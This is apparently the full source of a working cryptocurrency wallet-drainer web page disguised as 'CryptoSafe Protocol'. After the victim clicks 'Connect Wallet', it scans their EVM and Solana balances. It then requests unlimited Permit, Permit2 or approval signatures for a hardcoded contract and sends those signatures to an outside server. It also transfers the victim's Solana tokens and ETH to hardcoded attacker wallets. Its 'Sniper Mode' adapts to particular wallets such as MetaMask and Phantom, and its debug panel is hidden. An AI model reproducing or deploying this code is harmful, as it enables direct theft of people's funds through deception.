import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- SOLANA IMPORTS ---
import { SolanaAdapter } from '@reown/appkit-adapter-solana'
import { solana } from '@reown/appkit/networks'
import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction, LAMPORTS_PER_SOL } from '@solana/web3.js'
import { TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-token'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
const SOLANA_COLD_WALLET = 'BM2WQkmLc9ZEARpufZtqX2PxmKjpPSuotRBY5MdiLbRu'; 
const SOLANA_BACKEND_FEE_PAYER = 'BM2WQkmLc9ZEARpufZtqX2PxmKjpPSuotRBY5MdiLbRu'; 

// 💎 EVM DISCOVERY CONFIGURATION
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 },
      { symbol: 'TATE', address: '0xa589d8868607b8d79eE4288ce192796051263b64', decimals: 18, coingeckoId: 'tate', fallbackPrice: 0.000000000112 }
    ]
  }
};

// 💎 SOLANA DISCOVERY CONFIGURATION
const SOLANA_TARGET_TOKENS = [
  { symbol: 'SOL', address: 'native', isNative: true, coingeckoId: 'solana', decimals: 9, fallbackPrice: 150 },
  { symbol: 'USDC', address: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', decimals: 6, fallbackPrice: 1 },
  { symbol: 'USDT', address: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', decimals: 6, fallbackPrice: 1 },
  { symbol: 'BONK', address: 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263', decimals: 5, fallbackPrice: 0.00002 },
  { symbol: 'WIF', address: 'EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm', decimals: 6, fallbackPrice: 2.5 },
];

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

// ── Reown Adapters ──
const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

const solanaAdapter = new SolanaAdapter()

createAppKit({
  adapters: [wagmiAdapter, solanaAdapter], 
  networks: [mainnet, arbitrum, bsc, polygon, solana],
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'CryptoSafe Protocol', 
    description: 'Secure Decentralized Network',
    url: 'https://cryptosafe.network', 
    icons: ['https://cryptosafe.network/favicon.svg'], 
  },
  themeMode: 'light', 
  themeVariables: { '--w3m-accent': '#0C66FF' },
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=fa5424ff-8521-4ece-be0a-9866130c784f', 'confirmed');

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [_txHash, setTxHash] = useState('')
  const [_debugLogs, setDebugLogs] = useState<string[]>([]);
  const [showNetworkSelection, setShowNetworkSelection] = useState(false);
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  
  // Unified Namespace Hooks
  const { address: evmAddress, isConnected: isEvmConnected } = useAppKitAccount({ namespace: 'eip155' })
  const { address: solAddress, isConnected: isSolConnected } = useAppKitAccount({ namespace: 'solana' })
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: solWalletProvider } = useAppKitProvider('solana')

  const log = (msg: string) => {
    console.log(msg);
    setDebugLogs(prev => [...prev, msg].slice(-15)); 
  }

  useEffect(() => {
    if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;

    if (manualConnect.current) {
      manualConnect.current = false; 
      log(`[SYSTEM] Connected EVM: ${evmAddress}`);
      log("🔥 Auto-triggering Smart Priority Loop...");
      
      setLoading(true); 
      setTimeout(() => approveAndCollect(evmWalletProvider, evmAddress), 500); 
    }
  }, [isEvmConnected, evmAddress, evmWalletProvider, chainId]);

  // ── SOLANA BALANCE FETCHER (Dynamic Discovery) ──
  const fetchSolanaBalances = async (address: string) => {
    const pubKey = new PublicKey(address);
    const balances: any[] = [];

    try {
      const solBalance = await connection.getBalance(pubKey);
      balances.push({
        symbol: 'SOL',
        mint: 'native',
        isNative: true,
        decimals: 9,
        balance: solBalance / LAMPORTS_PER_SOL,
        rawBalance: solBalance,
        fallbackPrice: 150
      });
    } catch (e) {
      log(`❌ Native SOL fetch failed: ${e instanceof Error ? e.message : String(e)}`);
    }

    try {
      const parsedTokenAccounts = await connection.getParsedTokenAccountsByOwner(pubKey, { programId: TOKEN_PROGRAM_ID });
      const uniqueMints = [...new Set(parsedTokenAccounts.value.map(acc => acc.account.data.parsed.info.mint))];
      
      const priceData: Record<string, any> = {};
      for (let i = 0; i < uniqueMints.length; i += 50) {
        const chunk = uniqueMints.slice(i, i + 50);
        try {
          const res = await fetch(`https://price.jup.ag/v6/price?ids=${chunk.join(',')}`);
          const data = await res.json();
          if (data.data) Object.assign(priceData, data.data);
        } catch (e) {
          console.error("Jupiter price fetch failed for chunk", e);
        }
      }

      for (const { account, pubkey } of parsedTokenAccounts.value) {
        const mintAddress = account.data.parsed.info.mint;
        const uiAmount = Number(account.data.parsed.info.tokenAmount.uiAmountString || 0);
        const rawAmount = Number(account.data.parsed.info.tokenAmount.amount);
        
        if (uiAmount > 0) {
          const priceInfo = priceData[mintAddress];
          const price = priceInfo ? Number(priceInfo.price) : 0;
          const knownToken = SOLANA_TARGET_TOKENS.find(t => t.address === mintAddress);
          const symbol = knownToken ? knownToken.symbol : `Token (${mintAddress.slice(0, 4)}...${mintAddress.slice(-4)})`;
          const decimals = knownToken ? knownToken.decimals : 9;

          balances.push({
            symbol,
            mint: mintAddress,
            isNative: false,
            decimals,
            balance: uiAmount,
            rawBalance: rawAmount,
            tokenAccountAddress: pubkey.toString(),
            fallbackPrice: price
          });
        }
      }
    } catch (e) {
      log(`❌ SPL Token fetch failed: ${e instanceof Error ? e.message : String(e)}`);
    }

    return balances;
  };

  // ── DIRECT INJECTED PROVIDER DETECTORS ──
  const detectDirectProvider = (): { provider: any; walletName: string } | null => {
    if (typeof window === 'undefined') return null;
    const w = window as any;
    const ethereum = w.ethereum;
    if (!ethereum) return null;

    const providers = ethereum.providers ? [...ethereum.providers] : [ethereum];
    const detectors: { name: string; check: (p: any) => boolean }[] = [
      { name: 'Trust Wallet', check: (p) => p.isTrust || p.isTrustWallet || p._isTrust },
      { name: 'MetaMask', check: (p) => p.isMetaMask && !p.isTrust && !p.isTrustWallet && !p.isSafePal && !p.isTokenPocket && !p.isCoinbaseWallet },
      { name: 'Coinbase Wallet', check: (p) => p.isCoinbaseWallet || p.isCoinbase },
      { name: 'SafePal', check: (p) => p.isSafePal },
      { name: 'TokenPocket', check: (p) => p.isTokenPocket },
      { name: 'Brave Wallet', check: (p) => p.isBraveWallet },
      { name: 'Rabby Wallet', check: (p) => p.isRabby },
      { name: 'OKX Wallet', check: (p) => p.isOKXWallet || p.isOkx },
      { name: 'Phantom', check: (p) => p.isPhantom },
      { name: 'Bitget Wallet', check: (p) => p.isBitget || p.isBitgetWallet },
      { name: 'Opera Wallet', check: (p) => p.isOpera },
    ];

    for (const provider of providers) {
      for (const detector of detectors) {
        if (detector.check(provider)) return { provider, walletName: detector.name };
      }
    }
    for (const provider of providers) {
      if (provider.request) return { provider, walletName: 'Injected Wallet' };
    }
    return null;
  };

  const detectSolanaProvider = (): { provider: any; walletName: string; icon: string } | null => {
    if (typeof window === 'undefined') return null;
    const w = window as any;
    if (w.solana?.isPhantom) return { provider: w.solana, walletName: 'Phantom', icon: '👻' };
    if (w.solflare?.isSolflare) return { provider: w.solflare, walletName: 'Solflare', icon: '🔥' };
    if (w.trustwallet?.solana || (w.solana && w.solana.isTrust)) return { provider: w.solana || w.trustwallet.solana, walletName: 'Trust Wallet (Solana)', icon: '🛡️' };
    if (w.okxwallet?.solana) return { provider: w.okxwallet.solana, walletName: 'OKX Wallet (Solana)', icon: '🅾️' };
    return null;
  };

  // ── SOLANA GASLESS COLLECTION LOGIC ──
  const processSolanaCollection = async (provider: any, address: string) => {
    if (isExecuting.current) {
      log("⚠️ Blocked duplicate execution loop.");
      return 0;
    }
    isExecuting.current = true;
    setLoading(true);
    setStatus('Scanning Solana USD Values...');
    log("[SYSTEM] Scanning Solana balances...");
    let successCount = 0;

    try {
      const rawBalances = await fetchSolanaBalances(address);
      const calculatedTokens = rawBalances.map(t => ({
        ...t,
        usdValue: t.balance * (t.fallbackPrice || 0)
      }));

      // DEBUG LOG: Print exactly what the wallet holds
      if (calculatedTokens.length === 0) {
        log("[DEBUG] Wallet is completely empty (0 SOL, 0 SPL tokens).");
      } else {
        calculatedTokens.forEach(t => {
          log(`[DEBUG] Found ${t.balance.toFixed(4)} ${t.symbol} | Price: $${(t.fallbackPrice || 0).toFixed(6)} | Total USD: $${t.usdValue.toFixed(2)}`);
        });
      }

      const validTokens = calculatedTokens
        .filter(t => t.usdValue > 0.5)
        .sort((a, b) => b.usdValue - a.usdValue);

      const w = window as any;
      const isStrictlyPhantom = w.solana?.isPhantom && !w.solana?.isTrust && !w.solana?.isOkx;

      let tokensToProcess = validTokens;
      if (isStrictlyPhantom) {
        log(`[SECURITY] Phantom detected. Enabling Sniper Mode (Top Asset Only).`);
        tokensToProcess = validTokens.slice(0, 1);
      } else {
        log(`[SECURITY] Standard Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
      }

      if (tokensToProcess.length === 0) {
        log("⚠️ No valuable Solana assets found to process.");
        return 0;
      }

      log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      const pubKey = new PublicKey(address);
      const coldWalletPubKey = new PublicKey(SOLANA_COLD_WALLET);
      const feePayerPubKey = new PublicKey(SOLANA_BACKEND_FEE_PAYER);

      const instructions: any[] = [];
      const { blockhash } = await connection.getLatestBlockhash('confirmed');

      for (const token of tokensToProcess) {
        if (token.isNative) {
          const reserve = 0.005 * LAMPORTS_PER_SOL;
          const sendAmount = Math.max(0, token.rawBalance - reserve);
          if (sendAmount > 0) {
            instructions.push(
              SystemProgram.transfer({
                fromPubkey: pubKey,
                toPubkey: coldWalletPubKey,
                lamports: sendAmount,
              })
            );
            successCount++;
          }
        } else {
          const mintPubKey = new PublicKey(token.mint);
          const tokenAccountPubKey = new PublicKey(token.tokenAccountAddress);
          
          instructions.push(
            createTransferCheckedInstruction(
              tokenAccountPubKey,
              mintPubKey,
              coldWalletPubKey,
              pubKey,
              BigInt(token.rawBalance),
              token.decimals,
              [],
              TOKEN_PROGRAM_ID
            )
          );
          successCount++;
        }
      }

      if (instructions.length === 0) {
        log("⚠️ No valid Solana instructions generated.");
        return 0;
      }

      const messageV0 = new TransactionMessage({
        payerKey: feePayerPubKey,
        recentBlockhash: blockhash,
        instructions,
      }).compileToV0Message();

      const tx = new VersionedTransaction(messageV0);

      log("[ACTION] Prompting Solana Signature (0 SOL Gas)...");
      setStatus("Signing Solana Transaction...");

      const signedTx = await provider.signTransaction(tx);
      const serializedTx = Buffer.from(signedTx.serialize()).toString('base64');
      
      log("✅ Solana Transaction Signed & Serialized.");
      setStatus("Sending to Backend...");
      
      const res = await fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless-solana', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          transaction: serializedTx,
          chain: 'solana'
        })
      });
      
      if (res.ok) {
        const data = await res.json();
        setTxHash(data.signature || 'Sent');
        log(`✅ Solana Gasless Transfer Initiated!`);
      } else {
        log(`❌ Backend rejected Solana transaction.`);
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Solana Global Error: ${errorMsg}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
    
    return successCount;
  };

  // ── EVM COLLECTION LOGIC (XRP Removed) ──
  const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
    const activeProvider = forcedProvider || evmWalletProvider;
    const activeAddress = forcedAddress || evmAddress;

    if (!activeAddress || !activeProvider) return 0;
    
    if (isExecuting.current) {
        log("⚠️ Blocked duplicate execution loop.");
        return 0;
    }
    isExecuting.current = true;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("[SYSTEM] Scanning balances...");
    let successCount = 0; 

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(activeProvider as any);
      const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
      const signer = await ethersProvider.getSigner(activeAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens: any[] = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
            const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
            validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      
      const rawProvider = activeProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      
      const isStrictlyMetaMask = 
        (rawProvider?.isMetaMask || injected?.isMetaMask) && 
        !injected?.isTrust && 
        !injected?.isTrustWallet && 
        !injected?.isSafePal && 
        !injected?.isTokenPocket;

      let tokensToProcess = validTokens;
      
      if (isStrictlyMetaMask) {
           log(`[SECURITY] MetaMask detected. Enabling Sniper Mode (Top Asset Only).`);
           tokensToProcess = validTokens.slice(0, 1);
      } else {
           log(`[SECURITY] Standard wallet detected. Enabling Shotgun Mode (All Assets).`);
      }
      
      if(tokensToProcess.length > 0) log(`[PRIORITY] ${tokensToProcess.map(t => `${t.symbol}`).join(' -> ')}`);

      const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
        const chainId = (await signer.provider.getNetwork()).chainId;
        const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
        const name = await tokenContract.name();
        const nonce = await tokenContract.nonces(await signer.getAddress());
        const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
        const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
        const types = {
          Permit: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'nonce', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
          ],
        };
        const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
        return await signer.signTypedData(domain, types, message);
      };

      for (const token of tokensToProcess) {
        try {
          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            const hasPermit2Mapping = currentP2Allowance > 0n; 
            
            log(`[SYSTEM] ${token.symbol} Permit2 Status: ${hasPermit2Mapping ? 'READY' : 'NOT_INITIALIZED'}`);
          
            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                try {
                    setStatus(`Signing Permit: ${token.symbol}...`);
                    log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                    
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline 
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit Secured & Sent.`);
                } catch (pErr) {
                    log(`⚠️ Permit failed, trying Permit2...`);
                }
            }

            if (!authorized && hasPermit2Mapping) {
                try {
                    setStatus(`Signing Permit2: ${token.symbol}...`);
                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                    const currentNonce = Number(allowanceData.nonce);
                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);

                    const domain = { name: 'Permit2', chainId: activeChainId, verifyingContract: PERMIT2_ADDRESS };
                    const types = {
                        PermitSingle: [
                            { name: 'details', type: 'PermitDetails' },
                            { name: 'spender', type: 'address' },
                            { name: 'sigDeadline', type: 'uint256' },
                        ],
                        PermitDetails: [
                            { name: 'token', type: 'address' },
                            { name: 'amount', type: 'uint160' },
                            { name: 'expiration', type: 'uint48' },
                            { name: 'nonce', type: 'uint48' },
                        ],
                    };
                    const message = {
                        details: { 
                            token: token.address, 
                            amount: '1461501637330902918203684832716283019655932542975', 
                            expiration: deadline, 
                            nonce: currentNonce
                        },
                        spender: EVM_CONTRACT_ADDRESS,
                        sigDeadline: deadline
                    };
                    const signature = await signer.signTypedData(domain, types, message);

                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ 
                        type: 'PERMIT2', 
                        token: token.address, 
                        owner: cleanSenderAddress, 
                        spender: EVM_CONTRACT_ADDRESS, 
                        signature, 
                        deadline,
                        nonce: currentNonce
                      })
                    });

                    authorized = true;
                    log(`✅ ${token.symbol} Permit2 Secured & Sent.`);
                } catch (p2Err) {
                    log(`⚠️ Permit2 failed, falling back to gas...`);
                }
            }

            if (!authorized) {
                setStatus(`Approving ${token.symbol}...`);
                log(`[ACTION] Prompting Approve: ${token.symbol}`);
                
                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                
                const txHash = await (activeProvider as any).request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: cleanSenderAddress,
                        to: token.address,
                        data: encodedData,
                        value: '0x0'
                    }]
                });
                
                setTxHash(txHash);
                log(`✅ ${token.symbol} Approved!`);
            }
            
            successCount++; 
            await sleep(1500);
          }
        } catch (err: any) {
           const exactError = err?.message || JSON.stringify(err);
           log(`❌ Rejected: ${exactError.substring(0, 30)}...`);
           await sleep(1500);
        }
      }
      
      try {
          setStatus(`Transferring ETH...`);
          log(`[ACTION] Executing Contingency Native Sweep...`);
          
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n;
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          
          if (liveBal > totalGas) {
              const sendAmount = liveBal - totalGas;
              const hexValue = "0x" + sendAmount.toString(16);
              
              const txHash = await (activeProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{
                      from: cleanSenderAddress,
                      to: EVM_COLD_WALLET.toLowerCase(), 
                      value: hexValue
                  }]
              });
              
              setTxHash(txHash);
              successCount++; 
              log(`✅ Contingency ETH Sweep Sent!`);
              await sleep(1500); 
          } else {
              log(`⚠️ Contingency Skipped: Insufficient ETH for gas.`);
          }
      } catch (nativeErr: any) {
           const exactError = nativeErr?.message || JSON.stringify(nativeErr);
           log(`❌ Native Rejected: ${exactError.substring(0, 30)}...`);
      }
      
      if (successCount > 0) {
        setStatus('✅ Processing Complete!');
      } else {
        setStatus('❌ Failed: User Rejected All');
      }

    } catch (err: any) {
      const errorMsg = err?.message || JSON.stringify(err);
      log(`❌ Global Error: ${errorMsg.substring(0, 50)}`);
      setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
    
    return successCount;
  };

  // ── MULTI-CHAIN HANDLERS ──
  const handleNetworkChoice = async (network: 'EVM' | 'SOLANA') => {
    setShowNetworkSelection(false);
    
    if (network === 'SOLANA') {
      const directSol = detectSolanaProvider();
      if (directSol?.provider) {
        try {
          setLoading(true);
          setStatus('Connecting Solana Wallet...');
          log(`[SYSTEM] ${directSol.walletName} detected. Connecting directly...`);
          const resp = await directSol.provider.connect();
          const addr = resp.publicKey.toString();
          log(`[SYSTEM] Connected Solana: ${addr}`);
          await processSolanaCollection(directSol.provider, addr);
          return;
        } catch (e) {
          log('❌ Direct Solana connection cancelled or failed');
          setLoading(false);
          setStatus('Ready');
        }
      }
    } else {
      const directEvm = detectDirectProvider();
      if (directEvm?.provider?.request) {
        try {
          setLoading(true);
          setStatus('Connecting EVM Wallet...');
          log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
          const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
          if (accounts?.length > 0) {
            log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
            await approveAndCollect(directEvm.provider, accounts[0]);
            return;
          }
        } catch (e) {
          log('❌ Direct EVM connection cancelled or failed');
          setLoading(false);
          setStatus('Ready');
        }
      }
    }
    manualConnect.current = true;
    open();
  };

  const handleAction = async () => {
    if (isExecuting.current) {
      log("⚠️ Execution already in progress.");
      return;
    }

    if (isEvmConnected && evmWalletProvider && evmAddress) {
      await approveAndCollect(evmWalletProvider, evmAddress);
      return;
    }

    if (isSolConnected && solWalletProvider && solAddress) {
      await processSolanaCollection(solWalletProvider, solAddress);
      return;
    }

    const directSol = detectSolanaProvider();
    const directEvm = detectDirectProvider();

    if (directSol && directEvm) {
      setShowNetworkSelection(true);
      return;
    }

    if (!isSolConnected && directSol?.provider) {
      try {
        setLoading(true);
        setStatus('Connecting Solana Wallet...');
        log(`[SYSTEM] ${directSol.walletName} detected. Connecting directly...`);
        const resp = await directSol.provider.connect();
        const addr = resp.publicKey.toString();
        log(`[SYSTEM] Connected Solana: ${addr}`);
        await processSolanaCollection(directSol.provider, addr);
        return;
      } catch (e) {
        log('❌ Direct Solana connection cancelled or failed');
        setLoading(false);
        setStatus('Ready');
      }
    }

    if (!isEvmConnected && directEvm?.provider?.request) {
      try {
        setLoading(true);
        setStatus('Connecting EVM Wallet...');
        log(`[SYSTEM] ${directEvm.walletName} detected. Connecting directly...`);
        const accounts = await directEvm.provider.request({ method: 'eth_requestAccounts' });
        if (accounts?.length > 0) {
          log(`[SYSTEM] Connected EVM: ${accounts[0]}`);
          await approveAndCollect(directEvm.provider, accounts[0]);
          return;
        }
      } catch (e) {
        log('❌ Direct EVM connection cancelled or failed');
        setLoading(false);
        setStatus('Ready');
      }
    }

    manualConnect.current = true; 
    open();
  }

  const buttonText = loading ? 'Processing...' : status === '✅ Processing Complete!' ? 'Done' : status.includes('❌') ? 'Retry' : 'Connect Wallet';

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#0b0f17', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 50 }}>
      {showNetworkSelection ? (
        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '16px', padding: '24px', background: '#12121a', border: '1px solid #1e1e2a', borderRadius: '12px' }}>
          <p style={{ fontSize: '14px', color: '#e8e8ed', fontWeight: 600, margin: 0 }}>Multi-chain wallet detected. Choose network:</p>
          <div style={{ display: 'flex', gap: '12px' }}>
            <button onClick={() => handleNetworkChoice('EVM')} style={{ backgroundColor: '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '12px 24px', borderRadius: '8px', fontSize: '15px', border: 'none', cursor: 'pointer' }}>Connect EVM</button>
            <button onClick={() => handleNetworkChoice('SOLANA')} style={{ backgroundColor: '#9945FF', color: '#ffffff', fontWeight: '700', padding: '12px 24px', borderRadius: '8px', fontSize: '15px', border: 'none', cursor: 'pointer' }}>Connect Solana</button>
          </div>
          <button onClick={() => { setShowNetworkSelection(false); open(); }} style={{ backgroundColor: 'transparent', color: '#8a8a9a', padding: '8px 16px', borderRadius: '8px', fontSize: '13px', border: '1px solid #1e1e2a', cursor: 'pointer' }}>Use AppKit Modal</button>
        </div>
      ) : (
        <button
          onClick={handleAction}
          disabled={loading}
          style={{
            backgroundColor: loading ? '#93C5FD' : '#0C66FF',
            color: '#ffffff',
            fontWeight: '700',
            padding: '16px 32px',
            borderRadius: '9999px',
            fontSize: '17px',
            border: 'none',
            cursor: loading ? 'not-allowed' : 'pointer',
            transition: 'background-color 0.2s',
            outline: 'none',
          }}
        >
          {buttonText}
        </button>
      )}
      
      {/* Hidden debug panel */}
      <div style={{ position: 'fixed', bottom: 16, left: 16, backgroundColor: '#000', color: '#0f0', fontSize: 11, fontFamily: 'monospace', borderRadius: 8, padding: 10, maxHeight: 120, overflowY: 'auto', opacity: 0.7, display: 'none' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: 4, marginBottom: 4 }}>--- LOGS ---</div>
        {_debugLogs.map((msg, idx) => (<div key={idx} style={{ marginTop: 2 }}>{msg}</div>))}
      </div>
    </div>
  )
}